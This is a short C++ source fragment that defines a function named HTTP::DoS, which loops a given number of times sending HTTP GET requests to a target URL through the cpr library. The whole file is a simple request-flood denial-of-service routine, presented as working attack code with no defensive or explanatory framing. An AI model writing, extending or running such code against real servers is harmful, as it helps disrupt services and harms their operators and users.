#pragma once

#include "HTTP.h"

void HTTP::DoS(string url, int QUANTITY) {
	for (int i = 0; i < QUANTITY; i++) {
		cpr::Get(cpr::Url{ url });
	}
}